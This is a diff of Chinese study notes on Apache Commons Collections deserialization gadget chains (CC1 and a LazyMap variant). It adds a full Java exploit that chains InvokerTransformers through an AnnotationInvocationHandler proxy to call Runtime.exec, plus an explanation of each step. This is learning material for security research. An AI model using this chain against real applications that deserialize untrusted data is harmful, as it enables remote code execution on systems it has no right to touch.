@@ -228,7 +228,7 @@ public class CC1Test {
 }
 ```
 
-# 链子分析
+## 链子分析
 
 反序列化 -> readObject -> setValue ->checkSetValue -> ChainedTransformer.transformer ->在chain里面获取getmathod，通过getmathod获取invoke，通过invock调用exec，
 
@@ -237,3 +237,80 @@ map.put传入的键值对，其中的key在绕过if判断时有一点作用
 decorate方法时TransformedMap类中用来实例化对象的，相当于new，这里把chainedTransformer传入了
 
 在下面通过反射创建AnnotationInvocationHandler的实例化对象
+
+# CCone
+## 完整exp：
+
+```java
+package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+publi
+c class CConeTest {
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null, null}),
+                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//        chainedTransformer.transform(Runtime.class);
+
+        HashMap<Object,Object> map = new HashMap();
+        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);
+
+        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor d = c.getDeclaredConstructor(Class.class, Map.class);
+        d.setAccessible(true);
+        InvocationHandler h = (InvocationHandler)d.newInstance(Override.class,lazymap);
+
+        Map mapProxy = (Map)Proxy.newProxyInstance(map.getClass().getClassLoader(), new Class[]{Map.class}, h);
+        Object o = d.newInstance(Override.class, mapProxy);
+        serialize(o);
+        unserialize("person.txt");
+
+    }
+    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
+        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
+        oos.writeObject(obj);
+        System.out.println("序列化完成");
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
+    {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        System.out.println("反序列化"+Filename +"完成");
+        return obj;
+    }
+}
+```
+
+1. 这条链的前半部分和cc1是一样的，都是通过chainedTransformer。后续循环调用实现rce。
+
+和cc1不同的是cc1中使用的是TransformedMap.checkSetValue。
+
+而这里使用的是另外一条，LazyMap.get来实现后续，因为get方法同样实现了transform，并且factory参数可控
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758684564903-1bc67305-a3e3-40eb-9206-95dd0836cc4e.png)
+
+2. 那接下来谁能实现get方法呢。还是 `AnnotationInvocationHandler`中的`readObject`，之前cc1我们是用它触发setValue，这次是用它触发get![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758687093633-2c7d9882-1fd1-4cc5-b70d-527388df160e.png)
+3. 但是我们好像发现readObject中的memberTypes的参数我们无法控制，也就是说无法准确执行LazyMap的get。所以我们找其他的能控制参数的方法，作者找的是`readObject`中的invoke方法，我们知道动态代理调用方法时，就会自动触发invoke方法，所以我们只需要给map设置一个动态代理，调用的InvocationHandler是AnnotationInvocationHandler的实例化对象，，
+4. 现在当我们反序列化，会触发readObject，他会执行一个无参方法，所以自动调用了invok方法，触发后续链子
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758688618538-47f91883-9987-4b5b-81ef-e8b4d8b85c4c.png)
